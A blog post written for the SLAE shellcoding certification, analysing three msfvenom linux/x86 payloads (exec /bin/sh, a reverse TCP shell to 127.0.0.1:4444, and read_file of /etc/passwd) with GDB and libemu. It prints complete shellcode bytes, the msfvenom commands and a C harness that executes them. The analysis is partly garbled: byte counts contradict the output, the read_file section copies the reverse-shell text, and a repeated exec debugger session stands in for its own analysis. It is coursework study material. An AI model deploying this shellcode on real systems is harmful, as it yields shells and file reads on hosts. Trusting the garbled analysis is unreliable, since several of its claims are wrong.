---
title:  "SLAE x86 Assignment 5: Msfvenom Shellcode Analysis"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
#categories:
#  - exploit dev
classes: wide
#tags:
#  - exploit dev
#  - slae
---

![Shellcoding](/assets/images/slae32.png)

### Msfvenom Shellcode Analysis
------

* Take up at least 3 shellcode samples created using Msfvenom for linux/x86
* Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
* Present the analysis

#### Concept 
-----

Msfvenom will be used to generate the payloads for each of the 3 examples, along with an analysis/debugging of the shellcode and the associated system calls required to execute the payloads.

![Encoder](/assets/images/msfvenom.jpg)

The 3 Msfvenom examples that will be presented:

* <code class="language-plaintext highlighter-rouge">linux/x86/exec</code> 
* <code class="language-plaintext highlighter-rouge">linux/x86/shell_reverse_tcp</code> 
* <code class="language-plaintext highlighter-rouge">linux/x86/read_file</code> 

#### 1st Shellcode (linux/x86/exec)
--------

The exec payload will generate shellcode which spawns a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell using the <code class="language-plaintext highlighter-rouge">CMD</code> parameter:

```bash
osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/exec CMD=/bin/sh --arch x86 --platform linux -f c
No encoder or badchars specified, outputting raw payload
Payload size: 43 bytes
Final size of c file: 205 bytes
unsigned char buf[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
```

A C program scripted with the newly generated shellcode:

```c
/**
* Filename: exec_shellcode.c
* Author: h3ll0clar1c3
* Purpose: Spawn a shell on the local host  
* Compilation: gcc -fno-stack-protector -z execstack -m32 exec_shellcode.c -o exec  
* Usage: ./exec
* Shellcode size: 15 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";

int main()
{
        printf("Shellcode length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

As a POC, the C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 15 bytes:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -zexecstack exec_shellcode.c -o exec
osboxes@osboxes:~/Downloads/SLAE$ ./exec 
Shellcode length:  15
$ id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

The GDB (GNU Debugger) tool is used to step through the program code and analyze the system calls:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gdb ./exec --quiet
Reading symbols from /home/osboxes/Downloads/SLAE/exec...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break *&code
Breakpoint 1 at 0x804a040
(gdb) run
Starting program: /home/osboxes/Downloads/SLAE/exec 
Shellcode length:  15

Breakpoint 1, 0x0804a040 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0804a040 <+0>:	 push   0xb                        ; push 0xb (11) onto the stack         
   0x0804a042 <+2>:	 pop    eax                        ; pop 0xb into eax
   0x0804a043 <+3>:	 cdq                               ; set edx to 0
   0x0804a044 <+4>:	 push   edx                        ; push 0 onto the stack
   0x0804a045 <+5>:	 pushw  0x632d                     ; push -c argument onto the stack
   0x0804a049 <+9>:	 mov    edi,esp                    ; move stack pointer into edi
   0x0804a04b <+11>: push   0x68732f                       ; push hs/ onto the stack (/bin/sh in reverse order)
   0x0804a050 <+16>: push   0x6e69622f                     ; push nib/ onto the stack (/bin/sh in reverse order)
   0x0804a055 <+21>: mov    ebx,esp                        ; move stack pointer into ebx
   0x0804a057 <+23>: push   edx                            ; push 0 onto the stack
   0x0804a058 <+24>: call   0x804a065 <code+37>            ; call address 0x804a065 (/usr/bin/id)
   0x0804a05d <+29>: das    
   0x0804a05e <+30>: bound  ebp,QWORD PTR [ecx+0x6e]
   0x0804a061 <+33>: das    
   0x0804a062 <+34>: jae    0x804a0cc
   0x0804a064 <+36>: add    BYTE PTR [edi+0x53],dl
   0x0804a067 <+39>: mov    ecx,esp                        ; move stack pointer into ecx
   0x0804a069 <+41>: int    0x80                           ; call the interrupt to execute the execve syscall 
   0x0804a06b <+43>: add    BYTE PTR [eax],al
End of assembler dump.
(gdb) break *0x0804a069
Breakpoint 2 at 0x804a069
(gdb) c
Continuing.

Breakpoint 2, 0x0804a069 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
   0x0804a040 <+0>:	push   0xb
   0x0804a042 <+2>:	pop    eax
   0x0804a043 <+3>:     cdq    
   0x0804a044 <+4>:	push   edx
   0x0804a045 <+5>:	pushw  0x632d
   0x0804a049 <+9>:	mov    edi,esp
   0x0804a04b <+11>:	push   0x68732f
   0x0804a050 <+16>:	push   0x6e6962
   0x0804a055 <+21>:	mov    ebx,esp
   0x0804a057 <+23>:	push   edx
   0x0804a058 <+24>:	call   0x804a065 <code+37>
   0x0804a05d <+29>:	das    
   0x0804a05e <+30>:	bound  ebp,QWORD PTR [ecx+0x6e]
   0x0804a061 <+33>:	das    
   0x0804a062 <+34>:	jae    0x804a0cc
   0x0804a064 <+36>:	add    BYTE PTR [edi+0x53],dl
   0x0804a067 <+39>:	mov    ecx,esp
   0x0804a069 <+41>:	int    0x80
   0x0804a06b <+43>:	add    BYTE PTR [eax],al
End of assembler dump.
(gdb) break *0x0804a069
Breakpoint 2 at 0x804a069
(gdb) c
Continuing.

Breakpoint 2, 0x0804a069 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
   0x0804a040 <+0>:	push   0xb
   0x0804a042 <+2>:	pop    eax
   0x0804a043 <+3>:	cdq    
   0x0804a044 <+4>:	push   edx
   0x0804a045 <+5>:	pushw  0x632d
   0x0804a049 <+9>:     mov    edi,esp
   0x0804a04b <+11>:	push   0x68732f
   0x0804a050 <+16>:	push   0x6e69622f
   0x0804a055 <+21>:	mov    ebx,esp
   0x0804a057 <+23>:	push   edx
   0x0804a058 <+24>:	call   0x804a065 <code+37>
   0x0804a05d <+29>:	das    
   0x0804a05e <+30>:	bound  ebp,QWORD PTR [ecx+0x6e]
   0x0804a061 <+33>:	das    
   0x0804a062 <+34>:	jae    0x804a0cc
   0x0804a064 <+36>:	add    BYTE PTR [edi+0x53],dl
   0x0804a067 <+39>:	mov    ecx,esp
=> 0x0804a069 <+41>:	int    0x80
   0x0804a06b <+43>:	add    BYTE PTR [eax],al
End of assembler dump.
(gdb) stepi
process 6223 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
$ id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit
[Inferior 1 (process 6223) exited normally]
(gdb) quit
```   
 
The disassembled code consists of the following components:

* execve syscall -> <code class="language-plaintext highlighter-rouge">0xb</code>
* -c argument -> <code class="language-plaintext highlighter-rouge">0x632d</code>
* <code class="language-plaintext highlighter-rouge">/bin/sh</code> -> <code class="language-plaintext highlighter-rouge">0x68732f & <code class="language-plaintext highlighter-rouge">0x6e69622f</code> 
* call instruction -> <code class="language-plaintext highlighter-rouge">/usr/bin/id</code> 

#### 2nd Shellcode (linux/x86/shell_reverse_tcp)
--------------

A Reverse TCP shell initiates a connection from the target host back to the attacker’s IP address and listening port, executing a shell on the target host’s machine:

```bash
osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

The Sctest tool, part of the Libemu test suite, is used to inspect the program code and analyze the system calls:

```bash
osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | sctest -vvv -Ss 42
<-- SNIPPET -->
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int dup2 (
     int oldfd = 14;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 14;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 14;
     int newfd = 0;
) =  0;
int connect (
     int sockfd = 14;
     struct sockaddr_in * serv_addr = 0x00416fbe => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 16777343 (host=127.0.0.1);
             };
             char sin_zero = "       ";
         };
     int addrlen = 102;
) =  0;
int execve (
     const char * dateiname = 0x00416fa6 => 
           = "//bin/sh";
     const char * argv[] = [
           = 0x00416f9e => 
               = 0x00416fa6 => 
                   = "//bin/sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
```

Sctest is used to emulate the specific instructions in the shellcode visually displaying the execution of the reverse shell payload. The parameters included in the Msfvenom payload are all visibly shown, the listening host, listening port and <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell.

The required syscalls are shown:

* socket
* dup2
* connect
* execve

#### 3rd Shellcode (linux/x86/read_file)
--------------

A Reverse TCP shell initiates a connection from the target host back to the attacker’s IP address and listening port, executing a shell on the target host’s machine:

```bash
osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/read_file PATH=/etc/passwd --arch x86 --platform linux -f c
No encoder or badchars specified, outputting raw payload
Payload size: 73 bytes
Final size of c file: 331 bytes
unsigned char buf[] = 
"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
"\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";
```

let's try this again ...

```bash
osboxes@osboxes:~/Downloads/SLAE/Assignment_5$ gdb ./exec --quiet
Reading symbols from /home/osboxes/Downloads/SLAE/Assignment_5/exec...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break *&code
Breakpoint 1 at 0x804a040
(gdb) run
Starting program: /home/osboxes/Downloads/SLAE/Assignment_5/exec 
Shellcode length:  15

Breakpoint 1, 0x0804a040 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0804a040 <+0>:	push   0xb
   0x0804a042 <+2>:	pop    eax
   0x0804a043 <+3>:	cdq    
   0x0804a044 <+4>:	push   edx
   0x0804a045 <+5>:	pushw  0x632d
   0x0804a049 <+9>:	mov    edi,esp
   0x0804a04b <+11>:	push   0x68732f
   0x0804a050 <+16>:	push   0x6e69622f
   0x0804a055 <+21>:	mov    ebx,esp
   0x0804a057 <+23>:	push   edx
   0x0804a058 <+24>:	call   0x804a065 <code+37>
   0x0804a05d <+29>:	das    
   0x0804a05e <+30>:	bound  ebp,QWORD PTR [ecx+0x6e]
   0x0804a061 <+33>:	das    
   0x0804a062 <+34>:	jae    0x804a0cc
   0x0804a064 <+36>:	add    BYTE PTR [edi+0x53],dl
   0x0804a067 <+39>:	mov    ecx,esp
   0x0804a069 <+41>:	int    0x80
   0x0804a06b <+43>:	add    BYTE PTR [eax],al
End of assembler dump.
(gdb) break *0x0804a069
Breakpoint 2 at 0x804a069
(gdb) c
Continuing.

Breakpoint 2, 0x0804a069 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
   0x0804a040 <+0>:	push   0xb
   0x0804a042 <+2>:	pop    eax
   0x0804a043 <+3>:	cdq    
   0x0804a044 <+4>:	push   edx
   0x0804a045 <+5>:	pushw  0x632d
   0x0804a049 <+9>:	mov    edi,esp
   0x0804a04b <+11>:	push   0x68732f
   0x0804a050 <+16>:	push   0x6e69622f
   0x0804a055 <+21>:	mov    ebx,esp
   0x0804a057 <+23>:	push   edx
   0x0804a058 <+24>:	call   0x804a065 <code+37>
   0x0804a05d <+29>:	das    
   0x0804a05e <+30>:	bound  ebp,QWORD PTR [ecx+0x6e]
   0x0804a061 <+33>:	das    
   0x0804a062 <+34>:	jae    0x804a0cc
   0x0804a064 <+36>:	add    BYTE PTR [edi+0x53],dl
   0x0804a067 <+39>:	mov    ecx,esp
=> 0x0804a069 <+41>:	int    0x80
   0x0804a06b <+43>:	add    BYTE PTR [eax],al
End of assembler dump.
(gdb) stepi
process 6223 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
$ id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit
[Inferior 1 (process 6223) exited normally]
(gdb) exit
Undefined command: "exit".  Try "help".
(gdb) quit
```

##### SLAE Disclaimer ####
---------

This blog post has been created for completing the requirements of the [SLAE certification] [slae-link].

Student ID: PA-14936

GitHub Repo: [Code][github-code]

[slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
[github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment5
